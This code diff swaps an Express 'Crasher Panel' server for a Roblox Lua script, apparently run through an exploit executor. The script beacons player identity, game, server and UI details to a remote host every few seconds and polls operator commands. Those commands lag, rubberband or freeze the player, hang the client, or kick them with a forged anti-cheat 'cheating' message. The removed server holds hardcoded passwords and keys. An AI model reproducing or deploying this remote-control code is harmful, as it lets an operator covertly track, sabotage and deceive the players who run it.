@@ -1,236 +1,337 @@
-const express = require('express');
-const session = require('express-session');
-const app = express();
+-- ===== CONFIG =====
+local BASE = "https://crasherto-production.up.railway.app"  -- iyong URL
+local KEY = "CRASHER"
 
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(session({
-  secret: 'super-secret-123',
-  resave: false,
-  saveUninitialized: true,
-  cookie: { maxAge: 60000 * 60 * 24 }
-}));
+-- ===== REQUEST RESOLVER (with retry) =====
+local function resolveRequest()
+    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or getgenv().http_request or getgenv().request or (getgenv().syn and getgenv().syn.request)
+end
 
-// ===== CONFIG =====
-const PASSWORD = 'sigmaboy';
-const API_KEY = 'CRASHER';
-const OFFLINE_TIMEOUT = 10000;        // 10 sec para maging offline
-const CLEANUP_AGE = 3600000;          // 1 oras – auto-delete ng sobrang lumang offline
-const users = {};
+local request = resolveRequest()
+if not request then
+    for _ = 1, 10 do
+        task.wait(0.2)
+        request = resolveRequest()
+        if request then break end
+    end
+end
+if not request then return warn("❌ No request function found") end
 
-// ===== MIDDLEWARE =====
-function isAuth(req, res, next) {
-  if (req.session.loggedIn) return next();
-  res.redirect('/login');
-}
+-- ===== SERVICES =====
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
-// ===== CLEANUP (para hindi lumobo ang memory) =====
-setInterval(() => {
-  const now = Date.now();
-  for (const [id, data] of Object.entries(users)) {
-    if (now - data.lastHeartbeat > CLEANUP_AGE) {
-      delete users[id];
-    }
-  }
-}, 60000); // kada minuto
+local LP = Players.LocalPlayer
+if not LP then
+    for _ = 1, 30 do
+        task.wait(0.1)
+        LP = Players.LocalPlayer
+        if LP then break end
+    end
+end
+if not LP then return warn("❌ No LocalPlayer") end
 
-// ===== LOGIN =====
-app.get('/login', (req, res) => {
-  res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head><meta charset="UTF-8"><title>Login</title>
-    <style>
-      * { margin:0; padding:0; box-sizing:border-box; }
-      body { background: #0b0b0b; display:flex; justify-content:center; align-items:center; height:100vh; font-family:'Segoe UI',sans-serif; }
-      .login-box { background:#1a1a1a; padding:40px 50px; border-radius:20px; box-shadow:0 0 40px rgba(0,200,255,0.15); border:1px solid #2a2a2a; width:100%; max-width:400px; text-align:center; }
-      .login-box h1 { color:#00d4ff; font-size:32px; margin-bottom:8px; letter-spacing:1px; }
-      .login-box p { color:#888; margin-bottom:25px; }
-      .login-box input[type="password"] { width:100%; padding:14px 20px; background:#0d0d0d; border:1px solid #333; border-radius:10px; color:#fff; font-size:16px; margin-bottom:20px; outline:none; }
-      .login-box input[type="password"]:focus { border-color:#00d4ff; }
-      .login-box button { width:100%; padding:14px; background:linear-gradient(135deg,#00d4ff,#0088cc); border:none; border-radius:10px; color:#0a0a0a; font-size:18px; font-weight:bold; cursor:pointer; transition:0.2s; }
-      .login-box button:hover { transform:scale(1.02); background:linear-gradient(135deg,#00e5ff,#0099dd); }
-      .error { color:#ff4444; margin-top:15px; }
-    </style>
-    </head>
-    <body>
-      <div class="login-box">
-        <h1>⚡ CRASHER</h1>
-        <p>Enter password</p>
-        <form method="POST" action="/login">
-          <input type="password" name="password" placeholder="Password" required>
-          <button type="submit">SUBMIT</button>
-          ${req.query.error ? '<div class="error">Wrong password!</div>' : ''}
-        </form>
-      </div>
-    </body>
-    </html>
-  `);
-});
+-- ===== UTILITY =====
+local function safe(fn)
+    local ok, res = pcall(fn)
+    return ok and res or nil
+end
 
-app.post('/login', (req, res) => {
-  if (req.body.password === PASSWORD) {
-    req.session.loggedIn = true;
-    res.redirect('/');
-  } else {
-    res.redirect('/login?error=1');
-  }
-});
+local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
 
-app.get('/logout', (req, res) => {
-  req.session.destroy();
-  res.redirect('/login');
-});
+local function gameName()
+    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+    return info and info.Name or "Unknown Game"
+end
 
-// ===== DASHBOARD =====
-app.get('/', isAuth, (req, res) => {
-  const now = Date.now();
-  // I-compute ang online status para sa lahat ng users
-  for (const [id, data] of Object.entries(users)) {
-    data.online = (now - data.lastHeartbeat) <= OFFLINE_TIMEOUT;
-  }
+local function avatarUrl()
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
+end
 
-  // Pagbukud-bukurin: online muna
-  const sorted = Object.entries(users).sort((a, b) => {
-    if (a[1].online && !b[1].online) return -1;
-    if (!a[1].online && b[1].online) return 1;
-    return 0;
-  });
+local function serverPlayers()
+    local t = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        t[#t+1] = p.Name
+    end
+    return t
+end
 
-  let rows = '';
-  for (const [userId, data] of sorted) {
-    const c = data.commands || {};
-    const statusClass = data.online ? 'online' : 'offline';
-    const statusText = data.online ? '🟢 Online' : '🔴 Offline';
-    rows += `
-      <tr>
-        <td>
-          <strong>${data.username || 'Unknown'}</strong>
-          <span class="status ${statusClass}">${statusText}</span><br>
-          <span style="font-size:11px;color:#666;">${userId}</span>
-        </td>
-        <td style="text-align:center;">${data.brainrots ? data.brainrots.length : 0}</td>
-        <td style="text-align:center;">
-          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
-            <input type="hidden" name="id" value="${userId}">
-            <input type="hidden" name="cmd" value="lag_n">
-            <button class="cmd-btn ${c.lag_n ? 'active-lagn' : ''}" type="submit">LAG_N</button>
-          </form>
-          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
-            <input type="hidden" name="id" value="${userId}">
-            <input type="hidden" name="cmd" value="lag_c">
-            <button class="cmd-btn ${c.lag_c ? 'active-lagc' : ''}" type="submit">LAG_C</button>
-          </form>
-          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
-            <input type="hidden" name="id" value="${userId}">
-            <input type="hidden" name="cmd" value="destroy">
-            <button class="cmd-btn ${c.destroy ? 'active-destroy' : ''}" type="submit">💀 DESTROY</button>
-          </form>
-          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
-            <input type="hidden" name="id" value="${userId}">
-            <input type="hidden" name="cmd" value="kick">
-            <button class="cmd-btn ${c.kick ? 'active-kick' : ''}" type="submit">👢 KICK</button>
-          </form>
-        </td>
-      </tr>
-    `;
-  }
-  if (!rows) rows = `<tr><td colspan="3" style="text-align:center;color:#666;">No players yet. Run the script in Roblox.</td></tr>`;
+-- ===== BRAINROT COLLECTION (optimized) =====
+local lastBrainrotTime = 0
+local cachedBrainrots = {}
+local function collectBrainrots()
+    local now = tick()
+    if now - lastBrainrotTime < 10 then return cachedBrainrots end  -- refresh every 10 secs
+    lastBrainrotTime = now
+    local list = {}
+    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+    if pg then
+        for _, child in ipairs(pg:GetDescendants()) do
+            if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
+                local text = child.Text:gsub("^%s*(.-)%s*$", "%1")
+                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
+                    table.insert(list, { title = text, cash = "0" })
+                end
+            end
+        end
+    end
+    cachedBrainrots = list
+    return list
+end
 
-  res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head><title>Crasher Panel</title>
-    <style>
-      * { margin:0; padding:0; box-sizing:border-box; }
-      body { background:#0a0a0a; font-family:'Segoe UI',sans-serif; padding:20px; color:#eee; }
-      .container { max-width:1300px; margin:0 auto; background:#141414; border-radius:24px; padding:30px; border:1px solid #2a2a2a; box-shadow:0 0 30px rgba(0,0,0,0.8); }
-      .header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; padding-bottom:15px; margin-bottom:25px; flex-wrap:wrap; }
-      .header h1 { color:#00d4ff; font-size:28px; }
-      .header h1 small { font-size:16px; color:#666; margin-left:12px; font-weight:normal; }
-      .header a { color:#aaa; text-decoration:none; padding:8px 22px; border:1px solid #333; border-radius:30px; transition:0.2s; }
-      .header a:hover { background:#222; color:#fff; }
-      table { width:100%; border-collapse:collapse; margin-top:5px; }
-      th { background:#1a1a1a; color:#aaa; padding:14px 12px; text-align:left; border-bottom:2px solid #333; font-weight:600; }
-      td { padding:14px 12px; border-bottom:1px solid #1e1e1e; vertical-align:middle; }
-      tr:hover td { background:#1a1a1a; }
-      .status { font-size:12px; margin-left:10px; padding:2px 8px; border-radius:12px; }
-      .online { background:#00c85320; color:#00c853; }
-      .offline { background:#ff444420; color:#ff4444; }
-      .cmd-btn { 
-        background:#2a2a2a; color:#999; border:none; padding:6px 14px; border-radius:8px; cursor:pointer; font-weight:600; font-size:12px;
-        transition:0.15s; letter-spacing:0.3px;
-      }
-      .cmd-btn:hover { transform:scale(1.05); filter:brightness(1.3); }
-      .active-lagn { background:#00c853; color:#000; }
-      .active-lagc { background:#ff9100; color:#000; }
-      .active-destroy { background:#d50000; color:#fff; box-shadow:0 0 15px #d5000080; }
-      .active-kick { background:#ffd600; color:#000; }
-      .footer { margin-top:25px; color:#444; text-align:right; border-top:1px solid #1a1a1a; padding-top:15px; font-size:13px; }
-      .footer span { color:#666; }
-      @media (max-width:700px) { .header { flex-direction:column; align-items:start; gap:10px; } .cmd-btn { padding:4px 10px; font-size:11px; } }
-    </style>
-    </head>
-    <body>
-      <div class="container">
-        <div class="header">
-          <h1>⚡ CRASHER PANEL <small>${Object.keys(users).length} players • ${Object.values(users).filter(u=>u.online).length} online</small></h1>
-          <a href="/logout">Logout</a>
-        </div>
-        <table>
-          <tr><th>Player</th><th>Brainrots</th><th>Commands</th></tr>
-          ${rows}
-        </table>
-        <div class="footer">
-          <span>💀 DESTROY = sobrang lag | 🔄 Auto‑offline after 10s no heartbeat | 🗑️ Offline users auto‑removed after 1 hour</span>
-        </div>
-      </div>
-    </body>
-    </html>
-  `);
-});
+-- ===== HEARTBEAT =====
+local function heartbeat()
+    safe(function()
+        local body = {
+            user_id = LP.UserId,
+            username = LP.Name,
+            display_name = LP.DisplayName,
+            avatar_url = avatarUrl(),
+            place_id = game.PlaceId,
+            game_name = gameName(),
+            job_id = game.JobId,
+            executor = executorName,
+            server_players = serverPlayers(),
+            brainrots = collectBrainrots(),
+        }
+        local res = request({
+            Url = BASE .. "/api/public/heartbeat",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Api-Key"] = KEY,
+            },
+            Body = HttpService:JSONEncode(body),
+            Timeout = 5,
+        })
+        if res and res.StatusCode == 200 then
+            -- success
+        else
+            warn("[HEARTBEAT] Failed")
+        end
+    end)
+end
 
-// ===== TOGGLE COMMAND =====
-app.post('/cmd', isAuth, (req, res) => {
-  const { id, cmd } = req.body;
-  if (!users[id]) users[id] = { commands: {}, lastHeartbeat: 0 };
-  if (!users[id].commands) users[id].commands = {};
-  users[id].commands[cmd] = !users[id].commands[cmd];
-  res.redirect('/');
-});
+-- ===== LAG / DESTROY / KICK / CRASH =====
+local fpsConn = nil
+local fpsOn = false
+local function setFpsLimit(on)
+    if on == fpsOn then return end
+    fpsOn = on
+    if on then
+        fpsConn = RunService.RenderStepped:Connect(function()
+            local t = tick()
+            while tick() - t < 0.95 do end
+        end)
+    else
+        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
+    end
+end
 
-// ===== API: HEARTBEAT =====
-app.post('/api/public/heartbeat', (req, res) => {
-  const apiKey = req.headers['x-api-key'];
-  if (apiKey !== API_KEY) return res.status(403).send('Invalid API key');
-  const { user_id, username, brainrots } = req.body;
-  if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
-  if (!users[user_id]) users[user_id] = { commands: {} };
-  users[user_id].username = username || 'Unknown';
-  users[user_id].brainrots = brainrots || [];
-  users[user_id].lastHeartbeat = Date.now();
-  // online status will be computed on dashboard load
-  res.json({ status: 'ok' });
-});
+-- rubberband variables
+local HISTORY_SIZE = 0.27
+local INTERVAL = 0.6
+local NORMAL_SPEED_MIN = 35
+local CARRY_SPEED_MIN = 17
+local posHistory = {}
+local isActive = false
+local mode = nil
+local intervalThread = nil
 
-// ===== API: COMMAND (ginagamit ng Roblox script) =====
-app.get('/api/public/command', (req, res) => {
-  const apiKey = req.headers['x-api-key'];
-  if (apiKey !== API_KEY) return res.status(403).send('Invalid API key');
-  const userId = req.query.user_id;
-  if (!userId || !users[userId]) return res.json({});
-  const c = users[userId].commands || {};
-  res.json({
-    lag_n: !!c.lag_n,
-    lag_c: !!c.lag_c,
-    destroy: !!c.destroy,
-    kick: !!c.kick,
-    crash: !!c.crash
-  });
-});
+RunService.Heartbeat:Connect(function()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local now = tick()
+    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
+    local cutoff = now - HISTORY_SIZE - 0.1
+    while #posHistory > 0 and posHistory[1].time < cutoff do
+        table.remove(posHistory, 1)
+    end
+end)
 
-// ===== TEST =====
-app.get('/ping', (req, res) => res.send('✅ Server is alive!'));
+local function currentSpeed()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return 0 end
+    local v = root.AssemblyLinearVelocity
+    return Vector3.new(v.X, 0, v.Z).Magnitude
+end
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Server running on port', PORT));
+local function meetsSpeedReq()
+    local s = currentSpeed()
+    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
+    if mode == "carry" then return s >= CARRY_SPEED_MIN end
+    return false
+end
+
+local function doRubberband()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local vel = root.AssemblyLinearVelocity
+    local horizVel = Vector3.new(vel.X, 0, vel.Z)
+    if horizVel.Magnitude < 1 then return end
+    local targetTime = tick() - HISTORY_SIZE
+    local best = nil
+    for i = 1, #posHistory do
+        if posHistory[i].time >= targetTime then
+            best = posHistory[i].cframe
+            break
+        end
+    end
+    if not best then return end
+    root.CFrame = best
+    root.AssemblyLinearVelocity = vel
+end
+
+local function stopLoop()
+    if intervalThread then
+        task.cancel(intervalThread)
+        intervalThread = nil
+    end
+end
+
+local function startLoop()
+    stopLoop()
+    intervalThread = task.spawn(function()
+        local startTime = tick()
+        local iteration = 0
+        while isActive do
+            while isActive and not meetsSpeedReq() do
+                task.wait(0.05)
+            end
+            if not isActive then break end
+            iteration = iteration + 1
+            local targetT = startTime + (iteration * INTERVAL)
+            local sleepT = targetT - tick()
+            if sleepT > 0 then task.wait(sleepT) end
+            if isActive and meetsSpeedReq() then
+                doRubberband()
+            end
+        end
+    end)
+end
+
+local function setMode(newMode)
+    if mode == newMode then return end
+    mode = newMode
+    if mode then
+        isActive = true
+        startLoop()
+    else
+        isActive = false
+        stopLoop()
+    end
+end
+
+local isDestroyActive = false
+local destroyThread = nil
+local kicked = false
+local crashActive = false
+
+-- ===== POLL COMMANDS =====
+local function poll()
+    local res = safe(function()
+        return request({
+            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
+            Method = "GET",
+            Headers = { ["X-Api-Key"] = KEY },
+            Timeout = 5,
+        })
+    end)
+    if not res or not res.Body then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+    if not ok or type(data) ~= "table" then return end
+
+    -- FPS limit
+    if data.fps_limit ~= nil then
+        setFpsLimit(data.fps_limit == true)
+    end
+
+    -- Lag modes
+    local wantN = data.lag_n == true
+    local wantC = data.lag_c == true
+    if wantC then
+        setMode("carry")
+    elseif wantN then
+        setMode("normal")
+    else
+        setMode(nil)
+    end
+
+    -- Destroy
+    local wantDestroy = data.destroy == true
+    if wantDestroy ~= isDestroyActive then
+        isDestroyActive = wantDestroy
+        if isDestroyActive then
+            setMode(nil)  -- stop rubberband
+            if destroyThread then task.cancel(destroyThread) end
+            destroyThread = task.spawn(function()
+                while isDestroyActive do
+                    local char = LP.Character
+                    local root = char and char:FindFirstChild("HumanoidRootPart")
+                    if root then
+                        local vel = root.AssemblyLinearVelocity
+                        if vel.Magnitude > 0.5 then
+                            root.CFrame = root.CFrame - (CFrame.new(0,0,0) * (vel * 0.15))  -- mas smooth
+                            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
+                        end
+                    end
+                    task.wait(0.02)
+                end
+            end)
+        else
+            if destroyThread then task.cancel(destroyThread) destroyThread = nil end
+        end
+    end
+
+    -- Kick
+    if data.kick == true and not kicked then
+        kicked = true
+        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
+    end
+
+    -- Crash (freeze)
+    if data.crash == true and not crashActive then
+        crashActive = true
+        task.spawn(function()
+            while crashActive do
+                task.wait()  -- just keep alive
+            end
+        end)
+        while true do
+            -- intentionally hang the thread
+            task.wait(9e9)
+        end
+    end
+end
+
+-- ===== MAIN LOOPS =====
+heartbeat()
+poll()
+
+task.spawn(function()
+    while task.wait(3) do
+        heartbeat()
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.7) do
+        poll()
+    end
+end)
+
+-- ===== STOP SCRIPT (optional) =====
+_G.stopCrasher = function()
+    setMode(nil)
+    setFpsLimit(false)
+    if destroyThread then task.cancel(destroyThread) destroyThread = nil end
+    if intervalThread then task.cancel(intervalThread) intervalThread = nil end
+    isDestroyActive = false
+    crashActive = false
+    print("🛑 Crasher stopped")
+end
